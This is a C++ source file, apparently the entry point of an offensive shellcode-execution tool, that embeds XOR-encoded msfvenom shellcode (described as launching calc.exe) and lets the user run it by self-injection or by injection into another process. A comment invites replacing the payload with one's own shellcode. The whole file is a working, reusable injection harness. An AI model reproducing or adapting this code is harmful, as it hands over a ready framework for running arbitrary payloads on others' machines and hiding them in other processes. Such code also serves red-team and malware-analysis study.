﻿#include <iostream>

#include "ShellcodeExecution/ShellcodeSelfInjector.h"
#include "ShellcodeExecution/ShellcodeProcessInjector.h"

int main()
{
    using namespace ShellcodeExecution;

    // shellcode generated with msfvenom. Starts calc.exe
    // msfvenom -p windows/x64/exec CMD="calc.exe" -f c -v shellcode -e x64/xor EXITFUNC=thread
    // You can replace it with your own shellcode
    unsigned char shellcode[] =
        "\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05\xef"
        "\xff\xff\xff\x48\xbb\xa2\x4e\x0b\xc7\x37\xba\x9f\x5e\x48"
        "\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x5e\x06\x88"
        "\x23\xc7\x52\x5f\x5e\xa2\x4e\x4a\x96\x76\xea\xcd\x0f\xf4"
        "\x06\x3a\x15\x52\xf2\x14\x0c\xc2\x06\x80\x95\x2f\xf2\x14"
        "\x0c\x82\x06\x80\xb5\x67\xf2\x90\xe9\xe8\x04\x46\xf6\xfe"
        "\xf2\xae\x9e\x0e\x72\x6a\xbb\x35\x96\xbf\x1f\x63\x87\x06"
        "\x86\x36\x7b\x7d\xb3\xf0\x0f\x5a\x8f\xbc\xe8\xbf\xd5\xe0"
        "\x72\x43\xc6\xe7\x31\x1f\xd6\xa2\x4e\x0b\x8f\xb2\x7a\xeb"
        "\x39\xea\x4f\xdb\x97\xbc\xf2\x87\x1a\x29\x0e\x2b\x8e\x36"
        "\x6a\x7c\x08\xea\xb1\xc2\x86\xbc\x8e\x17\x16\xa3\x98\x46"
        "\xf6\xfe\xf2\xae\x9e\x0e\x0f\xca\x0e\x3a\xfb\x9e\x9f\x9a"
        "\xae\x7e\x36\x7b\xb9\xd3\x7a\xaa\x0b\x32\x16\x42\x62\xc7"
        "\x1a\x29\x0e\x2f\x8e\x36\x6a\xf9\x1f\x29\x42\x43\x83\xbc"
        "\xfa\x83\x17\xa3\x9e\x4a\x4c\x33\x32\xd7\x5f\x72\x0f\x53"
        "\x86\x6f\xe4\xc6\x04\xe3\x16\x4a\x9e\x76\xe0\xd7\xdd\x4e"
        "\x6e\x4a\x95\xc8\x5a\xc7\x1f\xfb\x14\x43\x4c\x25\x53\xc8"
        "\xa1\x5d\xb1\x56\x8f\x8d\xbb\x9f\x5e\xa2\x4e\x0b\xc7\x37"
        "\xf2\x12\xd3\xa3\x4f\x0b\xc7\x76\x00\xae\xd5\xcd\xc9\xf4"
        "\x12\x8c\x5a\x82\x74\xa8\x0f\xb1\x61\xa2\x07\x02\xa1\x77"
        "\x06\x88\x03\x1f\x86\x99\x22\xa8\xce\xf0\x27\x42\xbf\x24"
        "\x19\xb1\x3c\x64\xad\x37\xe3\xde\xd7\x78\xb1\xde\xa4\x56"
        "\xd6\xfc\x70\xc7\x36\x6e\xc7\x37\xba\x9f\x5e";

    
    ShellcodeExecutor* shellExec;
    
    std::cout << "Options:" << std::endl;
    std::cout << "1. Self injection" << std::endl;
    std::cout << "2. Process injection" << std::endl;
    std::cout << "> ";

    int choice;
    std::cin >> choice;

    switch (choice)
    {
    case 1:
        shellExec = new ShellcodeSelfInjector(shellcode, sizeof(shellcode));
        break;
    case 2:
        shellExec = new ShellcodeProcessInjector(shellcode, sizeof(shellcode));
        break;
    default:
        std::cout << "Unknown option" << std::endl;
        return 1;
    }
    
    shellExec->Execute();

    delete shellExec;
}
